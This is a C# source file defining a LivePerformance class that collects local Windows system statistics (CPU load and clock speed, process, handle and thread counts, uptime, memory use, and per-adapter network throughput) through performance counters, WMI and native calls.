using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using Orcus.Native;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Utilities;

namespace Orcus.Commands.LivePerformance
{
    internal class LivePerformance : IDisposable
    {
        private readonly PerformanceCounter _cpuPerformanceCounter;
        private readonly Dictionary<string, PerformanceCounter> _receiveCounters;
        private readonly Dictionary<string, PerformanceCounter> _sendCounters;

        public LivePerformance()
        {
            _cpuPerformanceCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            var performanceCounterCategory = new PerformanceCounterCategory("Network Interface");

            _sendCounters = new Dictionary<string, PerformanceCounter>();
            _receiveCounters = new Dictionary<string, PerformanceCounter>();
            foreach (var instanceName in performanceCounterCategory.GetInstanceNames())
            {
                _sendCounters.Add(instanceName,
                    new PerformanceCounter("Network Interface", "Bytes Sent/sec", instanceName));
                _receiveCounters.Add(instanceName,
                    new PerformanceCounter("Network Interface", "Bytes Received/sec", instanceName));
            }
        }

        public void Dispose()
        {
            _cpuPerformanceCounter.Dispose();
            foreach (var performanceCounter in _sendCounters)
                performanceCounter.Value.Dispose();

            foreach (var performanceCounter in _receiveCounters)
                performanceCounter.Value.Dispose();
        }

        public LiveData GetData()
        {
            var result = new LiveData {Handles = 0, Threads = 0};
            var processes = Process.GetProcesses();
            result.Processes = processes.Length;
            foreach (var process in processes)
            {
                result.Handles += process.HandleCount;
                result.Threads += process.Threads.Count;
            }
            result.ClockSpeed = GetCpuSpeedInGHz();
            result.InUse = (byte) Math.Round(_cpuPerformanceCounter.NextValue(), 0);
            result.UpTimeSeconds = CoreHelper.RunningOnVistaOrGreater
                ? (uint) (NativeMethods.GetTickCount64()/1000)
                : NativeMethods.GetTickCount()/1000;

            var memStatus = new MEMORYSTATUSEX();
            if (NativeMethods.GlobalMemoryStatusEx(memStatus))
                result.UsedMemory = memStatus.ullTotalPhys - memStatus.ullAvailPhys;

            result.EthernetAdapterData = new List<EthernetAdapterData>();
            foreach (var keyValue in _receiveCounters)
            {
                result.EthernetAdapterData.Add(new EthernetAdapterData
                {
                    Name = keyValue.Key,
                    BytesReceive = keyValue.Value.NextValue(),
                    BytesSend = _sendCounters[keyValue.Key].NextValue()
                });
            }

            return result;
        }

        private uint GetCpuSpeedInGHz()
        {
            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
            {
                var managementObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault();
                if (managementObject != null)
                    return managementObject.TryGetProperty<uint>("CurrentClockSpeed");
                return 0;
            }
        }
    }
}